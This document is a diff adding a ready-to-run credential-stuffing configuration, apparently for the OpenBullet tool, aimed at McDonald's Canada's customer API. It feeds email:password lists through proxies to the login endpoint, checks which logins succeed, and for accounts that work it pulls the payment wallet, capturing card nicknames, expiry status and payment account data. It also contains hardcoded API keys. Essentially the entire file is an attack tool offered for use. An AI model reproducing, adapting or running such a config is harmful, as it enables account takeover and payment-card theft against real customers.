@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "McDonalds CA (API)",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-16T12:30:48.3330148-04:00",
+  "AdditionalInfo": "",
+  "Author": "Howzi",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#login REQUEST POST "http://api.mcd.com/v2/customer/security/authentication?type=traditional" 
+  CONTENT "{\"password\":\"<PASS>\",\"type\":\"email\",\"loginUsername\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Arch/390 CFNetwork/975.0.3 Darwin/18.2.0" 
+  HEADER "mcd-sourceapp: MOT" 
+  HEADER "mcd-marketid: CA" 
+  HEADER "MarketId: CA.PROD4" 
+  HEADER "mcd-locale: en-CA" 
+  HEADER "mcd-apiuid: 644e1dd7-2a7f-18fb-b8ed-ed78c3f92c2bsd" 
+  HEADER "X-NewRelic-ID: UwUDUVNVGwEHXFhbAAUA" 
+  HEADER "mcd_apikey: CAIOSPRD9156941PROD4GNARASHDGTURNJVCA" 
+
+#status_check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "\"status\": \"ok\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"status\": \"error\"" 
+    KEY "\"status\":\"error\"" 
+  KEYCHAIN Ban OR 
+    KEY "HTTP/1.1 400 Bad Request" 
+    KEY "Access Denied" 
+  KEYCHAIN Retry OR 
+    KEY "Retry with a valid token" 
+
+#parse_tokens PARSE "<SOURCE>" JSON "token" Recursive=TRUE -> VAR "tokens" 
+
+#get_wallet REQUEST GET "https://api.mcd.com/v3/customer/payment/wallet" 
+  
+  HEADER "User-Agent: Arch/390 CFNetwork/975.0.3 Darwin/18.2.0" 
+  HEADER "mcd-sourceapp: MOT" 
+  HEADER "mcd-marketid: CA" 
+  HEADER "MarketId: CA.PROD4" 
+  HEADER "mcd-locale: en-CA" 
+  HEADER "mcd-apiuid: 644e1dd7-2a7f-18fb-b8ed-ed78c3f92c2bsd" 
+  HEADER "Authorization: Bearer <tokens[0]>" 
+  HEADER "X-NewRelic-ID: UwUDUVNVGwEHXFhbAAUA" 
+  HEADER "mcd_apikey: CAANDPRD9156941PROD4GNARASHDGTURNJVCA" 
+
+#pass_if_card_exist KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "PaymentCard\":[],\"" 
+
+#parse_NickName PARSE "<SOURCE>" JSON "NickName" Recursive=TRUE -> CAP "Card(s)" 
+
+#parse_IsExpired PARSE "<SOURCE>" JSON "IsExpired" Recursive=TRUE -> VAR "IsExpired" 
+
+FUNCTION Translate 
+  KEY "True" VALUE "Yes" 
+  KEY "False" VALUE "No" 
+  "<IsExpired>" -> CAP "Expired?" 
+
+PARSE "<SOURCE>" JSON "PaymentAccount" Recursive=TRUE -> CAP "PaymentAccount" 
+
